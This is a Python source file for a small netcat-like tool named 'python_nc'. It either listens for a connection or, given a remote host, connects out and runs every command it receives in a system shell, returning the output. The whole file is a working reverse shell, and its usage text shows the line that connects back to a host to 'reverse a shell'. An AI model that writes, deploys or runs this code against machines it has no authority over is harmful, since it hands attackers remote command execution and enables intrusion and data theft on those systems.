import os
import socket
import argparse
import struct
import subprocess
import textwrap

def exec_cmd(command, code_flag):
    command = command.decode("utf-8")
    if command[:2] == "cd" and len(command) > 2:
        try:
            os.chdir(command[3:])
            cmd_path = os.getcwd()
            stdout_res = f"切换到 {cmd_path} 路径下"
        except Exception:
            stdout_res = f"系统找不到指定的路径: {command[3:]}"
    else:
        obj = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                               stdin=subprocess.PIPE) 
        stdout_res = obj.stdout.read() + obj.stderr.read()
        if not stdout_res:
            stdout_res = f"{command} 执行成功"
        else:
            try:
                stdout_res = stdout_res.decode(code_flag)
            except Exception:
                if code_flag == "gbk":
                    code_flag = "utf-8"
                elif code_flag == "utf-8":
                    code_flag = "gbk"
                stdout_res = stdout_res.decode(code_flag)
    return stdout_res.strip()


def recv_data(sock, buf_size=1024):
    x = sock.recv(4)
    all_size = struct.unpack('i', x)[0]
    recv_size = 0
    data = b''
    while recv_size < all_size:
        data += sock.recv(buf_size)
        recv_size += buf_size
    return data


def send_data(sock, data):

    if type(data) == str:
        data = data.encode("utf-8")
    cmd_len = struct.pack('i', len(data))
    sock.send(cmd_len)
    sock.send(data)


def listen(arg, sock):
    lport = arg.port
    sock.bind(("0.0.0.0", lport))
    sock.listen(1)
    conn, addr = sock.accept()
    while 1:
        try:
            cmd = input(f"{addr}>").strip()
            if not cmd: continue
            send_data(conn, cmd)
            if cmd.lower() == "quit":
                conn.close()
                return
            res = recv_data(conn)
            print(res.decode("utf-8"))
        except KeyboardInterrupt:
            continue


def reverse_shell(arg, sock):
    rhost = arg.rhost
    rport = arg.port
    sock.connect((rhost, rport))
    code_flag = "gbk" if os.name == "nt" else "utf-8"
    while 1:
        data = recv_data(sock)
        if data == b'quit':
            break
        res = exec_cmd(data, code_flag)
        send_data(sock, res)


def main(arg):
    sock = socket.socket()
    if arg.rhost:
        reverse_shell(arg, sock)
    else:
        listen(arg, sock)
    sock.close()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='python_nc', formatter_class=argparse.RawDescriptionHelpFormatter,
                                     epilog=textwrap.dedent('''example:
       nc1.0.py -p 5555 # listen port
       nc1.0.py -r 192.168.1.108 -p 5555 # reverse a shell
       '''))
    parser.add_argument('-p', '--port', type=int, default=5555, help='specified port')
    parser.add_argument('-r', '--rhost', type=str, help='remote host')
    arg = parser.parse_args()

    main(arg)